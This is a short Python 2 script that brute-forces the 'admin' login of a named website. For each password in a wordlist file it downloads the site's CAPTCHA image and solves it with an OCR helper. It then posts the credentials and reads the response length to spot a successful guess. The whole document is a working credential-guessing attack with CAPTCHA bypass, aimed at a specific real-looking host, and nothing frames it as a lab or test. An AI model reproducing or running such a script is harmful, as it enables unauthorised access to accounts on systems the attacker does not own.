#coding:utf-8

import requests
from rec import rec

username = 'admin'
password = 'admin'

def login(user,pwd,codelen=4):
    url = 'http://www.t5csol.cn/vip.asp'
    codeurl = 'http://www.t5csol.cn/Include/getcode.asp?a=232&b=232&c=232&d=255&e=0&f=65'
    posturl = 'http://www.t5csol.cn/vip.asp?action=login'
    req = requests.session()
    req.get(url)
    #print req.cookies
    image = req.get(codeurl).content
    with open('code.gif','wb') as f:
        f.write(image)
    code = rec('code.gif')
    if len(code) != codelen:
        return login(user,pwd)
    #print code
    #print req.cookies
    data = 'username=%s&password=%s&code=%s&imageField.x=25&imageField.y=11' % (user,pwd,code)
    #print data
    t = req.post(posturl,data=data).content
    if len(t) == 77:
        print pwd,'wrong'
    elif len(t) == 73:
        return login(user,pwd)
    else:
        print '********NOTICE********'
        print pwd
        print '********NOTICE********'
        raw_input()
        exit()
    
f = open('pwd.txt','r')
for password in f.readlines():
    login(username,password.strip())
f.close()
